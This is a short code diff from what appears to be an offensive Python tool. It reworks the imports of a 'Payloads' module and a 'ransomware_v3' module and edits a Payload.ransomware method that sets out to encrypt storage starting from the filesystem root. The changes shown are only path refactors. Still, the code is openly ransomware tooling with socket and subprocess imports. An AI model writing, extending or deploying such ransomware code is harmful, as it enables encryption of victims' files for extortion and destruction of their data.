@@ -2,9 +2,9 @@ import subprocess
 import socket
 import sys
 import argparse
-import Payloads
+import utils.Payloads as Payloads
 import os
-import ransomware_v3
+import utils.ransomware_v3 as ransomware_v3
 
 icon = """\
 █▀█ █▀█ ▀▀▀█ 
@@ -70,7 +70,7 @@ class Payload:
     @staticmethod
     def ransomware(self, wholeStorage: bool = True, whatOrigin: str = '') -> bool:
         current_status = f'encrypting system from {whatOrigin}'
-        root = os.path.abspath('.').split(os.path.sep)[0] + os.path.sep
+        root = os.path.abspath('level_1').split(os.path.sep)[0] + os.path.sep
 
         if wholeStorage:
             try:
